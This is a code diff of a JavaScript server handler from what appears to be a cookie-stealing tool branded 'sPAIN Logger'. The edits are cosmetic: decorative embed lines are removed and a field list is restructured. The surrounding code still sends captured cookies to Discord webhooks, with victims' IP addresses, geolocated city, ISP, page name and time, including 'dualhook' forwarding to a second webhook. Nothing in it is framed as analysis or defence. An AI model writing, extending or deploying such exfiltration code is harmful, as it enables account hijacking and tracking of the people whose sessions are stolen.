@@ -125,8 +125,7 @@ export default async function handler(req, res) {
     const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
     await Promise.all(webhooks.map(wh => discordSend(wh, {
       embeds: [{
-        title:       '⚠️ Wrong Cookie — Troll Detected',
-        description: '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
+        title:  '⚠️ Wrong Cookie — Troll Detected',
         color:  0xff3333,
         fields: [
           { name: '🌐 IP',       value: ip,                   inline: true  },
@@ -157,29 +156,19 @@ export default async function handler(req, res) {
   const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
   const isp = geo?.isp || 'Unknown';
 
-  // webhook2 embed: IP, Page, DH Parent (if dualhook), Time, Location, ISP, Cookie
-  const wh2Fields = [
-    { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
-    { name: '📄 Page',     value: pName,        inline: true  },
-  ];
-  if (record.dualhookParent) {
-    wh2Fields.push({ name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true });
-  }
-  wh2Fields.push(
-    { name: '🕐 Time',     value: now, inline: false },
-    { name: '📍 Location', value: loc, inline: true  },
-    { name: '🗺️ ISP',      value: isp, inline: true  },
-  );
-
+  // webhook2 embed: IP, Page, Time, Location, ISP, Cookie
   await discordSend(webhook2, {
     content: '@everyone',
     embeds: [{
-      title:       '🍪 Cookie Captured',
-      description: record.dualhookParent
-        ? '<a:emoji_17:1508694920972468347> dh parent <a:emoji_17:1508694920972468347>'
-        : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
+      title:     '🍪 Cookie Captured',
       color:     0xc026d3,
-      fields:    wh2Fields,
+      fields: [
+        { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
+        { name: '📄 Page',     value: pName,        inline: true  },
+        { name: '🕐 Time',     value: now,          inline: false },
+        { name: '📍 Location', value: loc,          inline: true  },
+        { name: '🗺️ ISP',      value: isp,          inline: true  },
+      ],
       footer:    { text: `sPAIN Logger • ${pName}` },
       timestamp: now
     }]
@@ -191,8 +180,7 @@ export default async function handler(req, res) {
     await discordSend(webhook1, {
       content: '@everyone',
       embeds: [{
-        title:       '🍪 Cookie Captured (Dualhook)',
-        description: '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
+        title:     '🍪 Cookie Captured (Dualhook)',
         color:     0x06b6d4,
         fields: [
           { name: '🌐 IP',        value: `\`${ip}\``,                   inline: true  },
